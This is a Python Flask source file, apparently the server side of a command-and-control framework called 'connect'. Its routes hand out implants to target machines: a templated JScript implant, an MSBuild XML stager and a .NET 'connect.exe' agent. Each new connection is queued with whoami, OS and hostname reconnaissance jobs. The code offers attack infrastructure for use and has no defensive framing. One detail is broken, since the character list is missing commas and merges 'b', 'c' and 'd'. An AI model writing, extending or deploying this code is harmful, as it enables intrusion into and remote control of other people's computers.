import configparser
import os
import random

from connect.server import app, db
from connect.server.database import Routes, Connections, Jobs
from flask import request, render_template, send_file


def load_route(name):
    return Routes.query.filter(Routes.name == name).one().identifier


strs = []
chars = ['a', 'b' 'c' 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']


def generate_str():
    new_str = [str(chars[random.randint(0, len(chars)-1)]) for _ in range(0, 10)]
    new_str = ''.join(new_str)
    if new_str in strs:
        new_str = generate_str()
    strs.append(new_str)
    return new_str


@app.route(f"/{load_route('JScript')}", methods=['POST', 'GET'])
def jscript():
    """
    jscript Route

    The jscript route expects a get request and will return a implant to be executed on the target(s) machine. The
    implant will attempt to establish a command and control connection to the framework.
    """
    config = configparser.ConfigParser()
    config.read(f'{os.getcwd()}/connect/routes/jscript/config.ini')
    connection = Connections(type='JScript')
    db.session.add(connection)
    db.session.commit()
    check_in_job = Jobs(name='check_in', connection=connection, type=0)
    whoami_job = Jobs(name='whoami', connection=connection, type=-1)
    os_job = Jobs(name='os', connection=connection, type=-1)
    hostname_job = Jobs(name='hostname', connection=connection, type=-1)
    db.session.add(check_in_job)
    db.session.add(whoami_job)
    db.session.add(os_job)
    db.session.add(hostname_job)
    db.session.commit()
    return render_template('/jscript/connect.js', connection_id=connection.identifier,
                           check_in_uri=f"{request.host_url}{load_route('check_in')}",
                           check_in_job_id=check_in_job.identifier, sleep=config['REQUIRED']['check_in_delay'],
                           command_stdout=generate_str())


@app.route(f"/{load_route('MSBuild')}", methods=['POST', 'GET'])
def msbuild():
    """
    MSBuild Route

    ToDo
    """
    config = configparser.ConfigParser()
    config.read(f'{os.getcwd()}/connect/routes/msbuild/config.ini')
    connection = Connections(type='CSharp')
    db.session.add(connection)
    db.session.commit()
    check_in_job = Jobs(name='check_in', connection=connection, type=0)
    whoami_job = Jobs(name='whoami', connection=connection, type=-1)
    os_job = Jobs(name='os', connection=connection, type=-1)
    hostname_job = Jobs(name='hostname', connection=connection, type=-1)
    db.session.add(check_in_job)
    db.session.add(whoami_job)
    db.session.add(os_job)
    db.session.add(hostname_job)
    db.session.commit()
    check_in_uri = request.host_url + str(load_route('check_in'))
    csharp_uri = request.host_url + str(load_route('csharp'))
    return render_template('msbuild/msbuild.xml', check_in_uri=check_in_uri, check_in_job_id=check_in_job.identifier,
                           csharp_route=csharp_uri)


@app.route(f"/{load_route('csharp')}", methods=['GET'])
def csharp():
    """
    csharp route

    Returns a bytestream for the connect agent .NET assembly.
    """
    return send_file(f'{os.getcwd()}/connect/routes/csharp/connect.exe')
